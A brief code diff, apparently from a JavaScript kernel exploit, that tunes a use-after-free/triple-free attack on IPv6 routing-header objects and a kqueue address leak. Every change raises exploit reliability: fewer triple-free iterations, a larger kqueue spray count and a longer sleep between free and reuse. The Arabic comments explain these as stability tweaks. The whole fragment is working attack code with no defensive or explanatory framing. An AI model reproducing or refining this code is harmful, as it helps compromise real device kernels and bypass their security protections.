@@ -118,7 +118,7 @@ var IPV6_SOCK_NUM = 96;
 var IOV_THREAD_NUM = 6;
 var UIO_THREAD_NUM = 6;
 var MAIN_LOOP_ITERATIONS = 3;
-var TRIPLEFREE_ITERATIONS = 12;
+var TRIPLEFREE_ITERATIONS = 10;
 var MAX_ROUNDS_TWIN = 10;
 var MAX_ROUNDS_TRIPLET = 100;
 var MAIN_CORE = 0;
@@ -1633,7 +1633,7 @@ function leak_kqueue() {
   var magic_add = leak_rthdr.add(0x08);
 
   var count = 0;
-  var MAX_KQ = 2500; 
+  var MAX_KQ = 3000; 
 
   while (count < MAX_KQ) {
     count++;
@@ -1650,10 +1650,10 @@ function leak_kqueue() {
 
     // نحرر triplets[1] عشان نستخدمه في التسريب
     free_rthdr(ipv6_socks[triplets[1]]);
-
+    
     // توازن إيقاع: ندي الكيرنل نفس ياخده
     sched_yield();
-    nanosleep_fun(1); // كانت 1، خليناها 2 علشان ثبات أعلى
+    nanosleep_fun(2); // كانت 1، خليناها 2 علشان ثبات أعلى
 
     // محاولة التسريب
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
